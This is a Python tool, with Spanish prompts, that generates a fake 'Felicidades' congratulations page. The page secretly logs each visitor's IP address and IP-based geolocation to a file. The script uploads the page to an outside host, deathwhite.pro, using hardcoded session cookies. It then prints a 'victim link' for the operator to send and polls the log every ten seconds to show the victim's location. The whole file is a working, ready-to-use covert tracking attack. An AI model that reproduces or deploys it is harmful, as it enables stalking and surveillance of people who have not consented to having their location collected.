import sys
try:
 from colorama import Fore, Style, init
 from bs4 import BeautifulSoup as b
 import requests, time, os
 init(autoreset=True)
 GREEN = f'{Fore.GREEN}{Style.BRIGHT}'
 WHITE = f'{Fore.WHITE}{Style.BRIGHT}'
 print('')
 def create():
  with open('app.php', 'w') as f:
   f.write('''
  <?php
  date_default_timezone_set('America/Caracas');
  $dateNowText = 'Ingresó el '.date('d/m/Y').' a las '.date('h:i A');
  function getIPAddress() {
  $ip = $_SERVER['REMOTE_ADDR'];
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
  $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  }
  return $ip;
  }
  $urlDataIp = implode('', ['https://ipapi.co/', getIPAddress(), '/json/']);
  $ch = curl_init();
  $header = array(
      'Cache-Control: max-age=0'
  );
  curl_setopt($ch, CURLOPT_URL, $urlDataIp);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $dataIpText = curl_exec($ch);
  curl_close($ch);
  ?>
  <!DOCTYPE HTML>
  <html lang="es">
  <head>
  <title>Felicidades</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" type="text/css" href="style.css">
  <meta name="description" content="htmlgeneric">
  <meta name="author" content="PGX">
  <meta name="keywords" content="HTML5,CSS,JS,PHP">
  </head>
  <body>
  <?php
  $file = fopen("info.txt", "a");
  fwrite(
  $file, str_repeat("-=", 40).PHP_EOL.$dateNowText.PHP_EOL.$dataIpText.PHP_EOL.PHP_EOL
  );
  ?>
  </body></html>
   ''')
   f.close()

  with open('reset.php', 'w') as f:
   f.write('''<!DOCTYPE HTML>
  <html lang="es">
  <head>
   <title>Borrada...</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="description" content="htmlgeneric">
   <meta name="author" content="PGX">
   <meta name="keywords" content="HTML5,CSS,JS,PHP">
   <link rel="stylesheet" href="style.css">
  </head>
  <body>
   <?php
   $file = fopen("info.txt", "w");
   fwrite($file, "");
   ?>
  </body></html>''')
   f.close()

  with open('style.css', 'w') as f:
   f.write('''body{
   background-image: url('https://previews.123rf.com/images/babayuka/babayuka1702/babayuka170200013/70697113-felicidades-caligraf%C3%ADa-moderna-tarjeta-de-felicitaci%C3%B3n-caligr%C3%A1fica-de-lujo-colorida-con-confeti.jpg');
   background-size: cover;
   color:#ff0000;
  }
  .oculto {
   display: none;
  }''')
   f.close()

  with open('info.txt', 'w') as f:
   f.write('')

 create()
 geo = []
 links = []

 headers = {
  "Host": "deathwhite.pro",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
  "Cookie": "__test=017669a8ff3a78dfd4ad9319004c0a9d; PHPSESSID=1f0c5773f7d09d33976313bd85683db4"
 }

 show = ['LINK DE LA VICTIMA', 'BORRAR DATOS', 'DATOS GEOLOCALIZADOS', 'style.css']
 infgeo=[]

 def upload(files_to_upload):
  url = 'https://deathwhite.pro'
  files = {}
  for i, file_path in enumerate(files_to_upload):
   files[f'files[{i}]'] = open(file_path, 'rb')
  response = requests.post(url, files=files, headers=headers)
  soup = b(response.content, 'html.parser')
  find = soup.find_all('td', class_='linkx')
  for x, y in enumerate(zip(show, find)):
   if x == 2:
    link0=y[1].text
    infgeo.append(link0)
    print(f'{WHITE}{y[0]} => {GREEN}{link0}')
   elif x == 3:
    pass
   else:
    print(f'{WHITE}{y[0]} => {GREEN}{y[1].text}')

 files_to_upload = ['app.php', 'reset.php', 'info.txt', 'style.css']
 upload(files_to_upload)
 input(f'\n{WHITE}COPIE EL LINK DE LA VICTIMA Y\nPRESIONE {GREEN}[ENTER]{WHITE} PARA GEOLOCALIZAR : ')

 for i in files_to_upload:
  os.remove(i)
 while True:
  os.system('cls' if os.name == 'nt' else 'clear')
  print('\nSERVICIO INICIADO... [ESPERANDO DATOS]\n')
  try:
   req = requests.get(infgeo[0], headers=headers)
   res = req.content.decode('latin-1')
   if res:
    print(res)
  except Exception as e:
   print(f"Error: {e}")
  time.sleep(10)
except KeyboardInterrupt:
 print('\nHASTA LUEGO ...')
 sys.exit()
